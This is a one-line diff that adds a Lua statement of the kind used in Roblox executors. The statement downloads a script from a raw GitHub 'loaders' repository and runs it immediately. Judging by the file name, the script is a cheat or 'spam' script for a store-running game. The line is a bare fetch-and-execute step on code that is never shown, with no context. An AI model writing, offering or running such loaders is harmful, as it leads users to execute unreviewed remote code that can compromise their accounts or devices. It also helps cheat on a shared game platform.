@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/run-a-sari-sari-store-spam5-851eaat5kxwp31.lua"))()
